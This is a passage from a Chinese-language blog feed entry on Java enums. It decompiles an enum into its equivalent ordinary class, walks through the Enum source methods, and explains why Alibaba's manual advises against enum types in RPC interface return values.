src="枚举.assets/反编译2.png" alt="反编译2"></li><li><img src="枚举.assets/反编译3.png" alt="反编译3"></li></ul></li></ul><h5 id="✅还原成普通类"><a href="#✅还原成普通类" class="headerlink" title="✅还原成普通类"></a>✅还原成普通类</h5><ul><li><p>根据字节码的图片和其他博文，尽量还原<code>SeasonEnum</code>枚举的普通类形式</p><ul><li>在第一张图片的黄色框中可以看到，<code>SeasonEnum</code>是继承了<code>Enum</code>的，而在编码时期是无法手动继承，只能使用关键字实现这一继承</li><li><font color="Orange">*从第三张图片的static方法观察到，SeasonEnum内部声明的多个实例，其构造过程是编译器在静态代码库中，调用 SeasonEnum 自身和父类的构造函数完成定义的*</font> </li><li><p>还原的过程省略了如<code>toString</code>等方法，可得如下普通类</p></li><li><p>```java<br>public final class SeasonEnum extends java.lang.Enum {</p><pre><code>// 枚举值public static final SeasonEnum SPRING;public static final SeasonEnum SUMMER;public static final SeasonEnum AUTUMN;public static final SeasonEnum WINTER;// 枚举值数组private static final SeasonEnum[] $VALUES;// 定义的成员变量private String index;private String description;// 获取枚举数组public static SeasonEnum[] values() &#123;    return $VALUES.clone();&#125;// 根据枚举值的变量名获取枚举值public static SeasonEnum valueOf(String name) &#123;    return Enum.valueOf(SeasonEnum.class, name);&#125;// 带参构造方法private SeasonEnum(String name, int ordinal, String index, String description)&#123;    super(name, ordinal);    this.index = index;    this.description = description;&#125;// 初始化static&#123;    SPRING = new SeasonEnum(&quot;SPRING&quot;, 0, &quot;1&quot;, &quot;春天&quot;);    SUMMER = new SeasonEnum(&quot;SUMMER&quot;, 1, &quot;2&quot;, &quot;夏天&quot;);    AUTUMN = new SeasonEnum(&quot;AUTUMN&quot;, 2, &quot;3&quot;, &quot;秋天&quot;);    WINTER = new SeasonEnum(&quot;WINTER&quot;, 3, &quot;4&quot;, &quot;冬天&quot;);    $VALUES = (new SeasonEnum[] &#123;            SPRING, SUMMER, AUTUMN, WINTER    &#125;);&#125;</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### ✅源码分析</span><br><span class="line"></span><br><span class="line">- 观察 `java.lang`包下的`Enum`源代码其中定义的两个属性，及同名函数</span><br><span class="line"></span><br><span class="line">  - ```java</span><br><span class="line">    public abstract class Enum&lt;E extends Enum&lt;E&gt;&gt; implements Comparable&lt;E&gt;, Serializable &#123;</span><br><span class="line">    </span><br><span class="line">        private final String name;</span><br><span class="line">    </span><br><span class="line">        public final String name() &#123;</span><br><span class="line">            return name;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        private final int ordinal;</span><br><span class="line">    </span><br><span class="line">        public final int ordinal() &#123;</span><br><span class="line">            return ordinal;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        protected Enum(String name, int ordinal) &#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">            this.ordinal = ordinal;</span><br><span class="line">        &#125;</span><br><span class="line">        ...  // omit some content</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><font color="Orange">*从源码中可知 Enum的构造函数为 **protected** 级别，再从[反编译](#mime)的照片观察到 SeasonEnum内部声明的四个实例，发现并未显式调用Enum父类的构造函数，甚至连SeasonEnum自身的构造函数也没有显式调用。由此可知，枚举类内部定义的多个实例，其构造过程是由编译器调用构造函数来处理完成的。从Enum构造函数的注释，也可以佐证这一点*</font> </li><li><img src="枚举.assets/enum构造方法的注释说明.png" alt="enum构造方法的注释说明"></li></ul></li></ul><h4 id="⭐枚举中的方法"><a href="#⭐枚举中的方法" class="headerlink" title="⭐枚举中的方法"></a>⭐枚举中的方法</h4><h5 id="✅方法汇总"><a href="#✅方法汇总" class="headerlink" title="✅方法汇总"></a>✅方法汇总</h5><ul><li><p>java.lang.Enum中的方法</p><ul><li><img src="枚举.assets/Enum中的方法.png" alt="Enum中的方法"></li></ul></li><li><p>SeasonEnum中的方法</p><ul><li>| 返回值       | 方法     | 描述                         |<br>| —————— | ———— | —————————————— |<br>| SeasonEnum[] | values() | 返回一个此枚举所有实例的数组 |</li></ul></li></ul><h5 id="✅name-和toString"><a href="#✅name-和toString" class="headerlink" title="✅name()和toString()"></a>✅name()和toString()</h5><ul><li>name()<ul><li>根据枚举值来获取该枚举成员的变量名。</li></ul></li><li>toString()<ul><li>返回枚举值的变量名。</li></ul></li><li>相同点<ul><li>作用相同，均可获取枚举成员的变量名</li></ul></li><li>不同点<ul><li>调用时的参数不同</li><li>name方法是用final修饰的不能被重写，而toString是可以被重写的</li></ul></li></ul><h5 id="✅ordinal"><a href="#✅ordinal" class="headerlink" title="✅ordinal()"></a>✅ordinal()</h5><ul><li><p>该方法作用是，返回定义的枚举值的顺序，从0开始计数。</p></li><li><p>ordinal()方法是被设计用于基于枚举的复杂数据结构，例如EnumSet和EnumMap 。 </p></li><li><p>如果修改了枚举值定义的顺序，就会导致枚举值<code>ordinal()</code>的返回值发生变化</p><ul><li><p>所以一般枚举的做法就是在枚举内增加成员变量，再通过枚举值来自定义顺序，如本文使用的<code>SeasonEnum</code>枚举</p></li><li><p>```java<br>SPRING(“1”,”春天”),<br>SUMMER(“2”,”夏天”),<br>AUTUMN(“3”,”秋天”),<br>WINTER(“4”,”冬天”);</p><p>// 自定义顺序<br>@Getter<br>private String index;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### ✅valueOf()</span><br><span class="line"></span><br><span class="line">- ```java</span><br><span class="line">  // 上述反编译后的SeasonEnum枚举的valueOf()方法</span><br><span class="line">  public static SeasonEnum valueOf(String name) &#123;</span><br><span class="line">      return Enum.valueOf(SeasonEnum.class, name);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  // Enum源码中的valueOf()方法</span><br><span class="line">  public static &lt;T extends Enum&lt;T&gt;&gt; T valueOf(Class&lt;T&gt; enumType, String name) &#123;</span><br><span class="line">      T result = enumType.enumConstantDirectory().get(name);</span><br><span class="line">      if (result != null)</span><br><span class="line">          return result;</span><br><span class="line">      if (name == null)</span><br><span class="line">          throw new NullPointerException(&quot;Name is null&quot;);</span><br><span class="line">      throw new IllegalArgumentException(</span><br><span class="line">          &quot;No enum constant &quot; + enumType.getCanonicalName() + &quot;.&quot; + name);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><font color="Orange">*比较反编译生成的 valueOf 函数和Enum 源码中的 valueOf 函数，可以发现，编译器生成的 valueOf 函数内部调用的其实就是父类 Enum中定义的 valueOf 函数。*</font> </li><li><p>而父类 Enum中定义的 valueOf 函数，其实调用的是 Class 类中定义的 enumConstantDirectory 函数，在该函数内对参数 enumType 是否为枚举类型进行判断</p><ul><li>当传入null时，抛出<code>NullPointerException</code>异常<ul><li><img src="枚举.assets/NullPointerException异常.png" alt="NullPointerException异常"></li></ul></li><li>当传入不存在的枚举值时，抛出<span id="IllegalArgumentException">IllegalArgumentException</span>异常<ul><li><img src="枚举.assets/IllegalArgumentException异常.png" alt="IllegalArgumentException异常"></li></ul></li><li>当传入存在的枚举值时，返回枚举实例名称和枚举实例构成的 map 对象<ul><li><img src="枚举.assets/valueof传入正常枚举值.png" alt="valueof传入正常枚举值"></li></ul></li></ul></li></ul><h5 id="✅values"><a href="#✅values" class="headerlink" title="✅values()"></a>✅values()</h5><ul><li><p>该方法在<code>java.lang.Enum</code>中不存在</p></li><li><p>观察反编译生成的 values 函数，返回的是枚举类内部声明的实例数组的 clone 对象，即返回一个所有枚举值的数组</p><ul><li><p>```java<br>public static SeasonEnum[] values() {</p><pre><code>return $VALUES.clone();</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### ✅compareTo()</span><br><span class="line"></span><br><span class="line">- 该方法用来比较两个枚举值的`ordinal`值，即枚举值的定义序号</span><br><span class="line"></span><br><span class="line">- 观察Enum源码， Enum实现了Comparable接口，而 Comparable 接口中只有一个函数声明，即Enum重写compareTo函数。可以看到，先判断是不是同一个枚举类的变量，再返回当前枚举值和传递的枚举值差值。</span><br><span class="line"></span><br><span class="line">  - ```java</span><br><span class="line">    public final int compareTo(E o) &#123;</span><br><span class="line">        Enum&lt;?&gt; other = (Enum&lt;?&gt;)o;</span><br><span class="line">        Enum&lt;E&gt; self = this;</span><br><span class="line">        if (self.getClass() != other.getClass() &amp;&amp; // optimization</span><br><span class="line">            self.getDeclaringClass() != other.getDeclaringClass())</span><br><span class="line">            throw new ClassCastException();</span><br><span class="line">        return self.ordinal - other.ordinal;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>```java<br>Season summer = Season.valueOf(“SUMMER”);<br>for(Season s : Season.values()){</p><pre><code>System.out.print(summer.name()+&quot; compare to &quot;+s.name());System.out.println(&quot; result: &quot;+summer.compareTo(s));</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```java</span><br><span class="line">  // 返回正数表示当前对象较大，0 表示大小相等，负数表示当前对象较小，差值表示声明顺序的差距大小。</span><br><span class="line">  SUMMER compare to SPRING result: 1</span><br><span class="line">  SUMMER compare to SUMMER result: 0</span><br><span class="line">  SUMMER compare to AUTUMN result: -1</span><br><span class="line">  SUMMER compare to WINTER result: -2</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="⭐业务场景举例"><a href="#⭐业务场景举例" class="headerlink" title="⭐业务场景举例"></a>⭐业务场景举例</h4><blockquote><ul><li><strong>星期：</strong> Monday（星期一）、Tuesday（星期二）、Wednesday（星期三）、Thursday（星期四）、Firday（星期五）、Saturday（星期六）、Sunday（星期日）</li><li><strong>性别：</strong> Man（男）、Woman（女）</li><li><strong>季节：</strong> Spring（春天）、Summer（夏天）、Autumn（秋天）、Winter（冬天）</li><li><strong>支付方式：</strong> Cash（现金）、WeChatPay（微信）、Alipay（支付宝）、BankCard（银行卡）、CreditCard（信用卡）</li><li><strong>订单状态：</strong> Nonpayment（未付款）、Paid（已付款）、Fulfilled（已配货）、Delivered（已发货）、Return（退货）、Checked（已确认）</li><li><strong>线程状态：</strong> Establish（创建）、Ready（就绪）、Run（运行）、Obstruct（阻塞）、Die（死亡）</li></ul></blockquote><h4 id="⭐注意事项"><a href="#⭐注意事项" class="headerlink" title="⭐注意事项"></a>⭐注意事项</h4><h5 id="✅阿里巴巴开发手册关于枚举建议（1-4-0）"><a href="#✅阿里巴巴开发手册关于枚举建议（1-4-0）" class="headerlink" title="✅阿里巴巴开发手册关于枚举建议（1.4.0）"></a>✅阿里巴巴开发手册关于枚举建议（1.4.0）</h5><ul><li><img src="枚举.assets/阿里巴巴开发手册-枚举3.png" alt="阿里巴巴开发手册-枚举3"></li></ul><h5 id="✅二方库释义"><a href="#✅二方库释义" class="headerlink" title="✅二方库释义"></a>✅二方库释义</h5><blockquote><p>一方库指的是本项目中的依赖</p><p>二方库指的是公司内部其他项目提供的依赖</p><p>三方库指的是其他组织、公司等来自第三方的依赖</p></blockquote><h5 id="✅为什么不建议接口的返回值包含枚举类型呢？"><a href="#✅为什么不建议接口的返回值包含枚举类型呢？" class="headerlink" title="✅为什么不建议接口的返回值包含枚举类型呢？"></a>✅为什么不建议接口的返回值包含枚举类型呢？</h5><ul><li><p>假设有一个二方库，A系统和B系统都依赖了该二方库，同时B系统通过RPC远程调用A系统的一个接口（该接口中返回值中有一个参数类型是枚举类型）</p><ul><li><p>```java<br>// 二方库中的枚举<br>public enum AType{</p><pre><code>P_T,A_B</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```java</span><br><span class="line">  // A系统</span><br><span class="line">  public interface AService &#123;</span><br><span class="line">      public AResponse doSth(ARequest aRequest);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  public Class AResponse&#123;</span><br><span class="line">      private Boolean success;</span><br><span class="line">      // 返回值包括了枚举</span><br><span class="line">      private AType aType;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p>```java<br>// B系统<br>public class BService {</p><pre><code>@AutowiredAService aService;public void doSth()&#123;    ARequest aRequest = new ARequest();    AResponse aResponse = aService.doSth(aRequest);    AType aType = aResponse.getAType();&#125;</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- 当两个使用同一个枚举的时候是不会出现问题的，即在原来的二方库上可以继续使用。但在某天，二方库中的枚举进行了升级，A系统也跟着升级，而B系统并没有跟着升级，即</span><br><span class="line"></span><br><span class="line">  - ```java</span><br><span class="line">    // 二方库中的枚举，也是A系统的枚举</span><br><span class="line">    public enum AType&#123;</span><br><span class="line">        P_T,</span><br><span class="line">        A_B,</span><br><span class="line">        P_M</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // B系统的枚举</span><br><span class="line">    public enum AType&#123;</span><br><span class="line">        P_T,</span><br><span class="line">        A_B,</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><font color="Orange">*这种情况下，在B系统通过RPC调用A系统的时候，如果A系统返回的AResponse中的aType的类型为新增的P_M时候，B系统就会无法解析。一般在这种时候，RPC框架就会发生反序列化异常。导致程序被中断。*</font> </li></ul><h5 id="✅RPC反序列化枚举异常分析"><a href="#✅RPC反序列化枚举异常分析" class="headerlink" title="✅RPC反序列化枚举异常分析"></a>✅RPC反序列化枚举异常分析</h5><ul><li>RPC框架大多数会采用JSON的格式进行数据传输，也就是客户端会将返回值序列化成JSON字符串，而服务端会再将JSON字符串反序列化成一个Java对象。</li><li>而JSON在反序列化的过程中，对于一个枚举类型，会尝试调用对应的枚举类的valueOf方法来获取到对应的枚举。</li><li>如果从枚举类中找不到对应的枚举项的时候，就会抛出<a href="#IllegalArgumentException">IllegalArgumentException</a>，这也是为什么阿里巴巴不推荐在接口的返回值中包含二方库枚举的原因</li></ul><h4 id="⭐小结"><a href="#⭐小结" class="headerlink" title="⭐小结"></a>⭐小结</h4><ul><li><p>总的来说，枚举在代码设计可以体现为，语义化地代表词典并作为一个独立的引用类型存在。</p></li><li><p>如果担心枚举使用不当，可以使用字符串常量来代表字典，这个是最常见的一刀切方式。例如上述中RPC反序列化异常的问题，如果使用字符串代替RPC接口中的枚举，那么B系统只需要传递字符串就行，至于传递的值的合法性，只需要在A系统内进行校验就可以了。</p></li><li>但是笔者觉得这种投鼠忌器的方式不太好，尽管枚举可能会带来扩展兼容性的问题，我们应当做的是避免出现扩展兼容性的问题（即按照阿里巴巴推荐方式）。对于单体项目或者需要快速迭代的项目，枚举便利性收益是大于兼容性的。</li></ul><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><ul><li><a href="https://developer.aliyun.com/article/665108">Java枚举类型enum - 阿里云开发者社区</a></li><li><a href="https://www.bilibili.com/video/BV1A34y1v7aL?spm_id_from=333.337.search-card.all.click">都有常量了，为啥还要用枚举？ - 哔哩哔哩</a></li><li><a href="https://blog.51cto.com/u_11440114/5102212">一文看懂Java的枚举 - 51CTO博客</a></li><li><a href="https://developer.aliyun.com/special/tech-java">Java开发手册 - 阿里云开发者社区</a></li><li><a href="https://mp.weixin.qq.com/s/LJuE9cH2FrwN6-1qEud6LA">求你了，不要再在对外接口中使用枚举类型了！- Hollis - 公众号</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;枚举&quot;&gt;&lt;a href=&quot;#枚举&quot; class=&quot;headerlink&quot; title=&quot;枚举&quot;&gt;&lt;/a&gt;枚举&lt;/h2&gt;&lt;h4 id=&quot;⭐什么是枚举&quot;&gt;&lt;a href=&quot;#⭐什么是枚举&quot; class=&quot;headerlink&quot; title=&quot;⭐什么是枚举&quot;&gt;&lt;/a&gt;⭐</summary>
      
    
    
    
    <category term="categories3" scheme="https://baicai.icu/categories/categories3/"/>
    
    
    <category term="tags3" scheme="https://baicai.icu/tags/tags3/"/>
    
  </entry>
  
</feed>
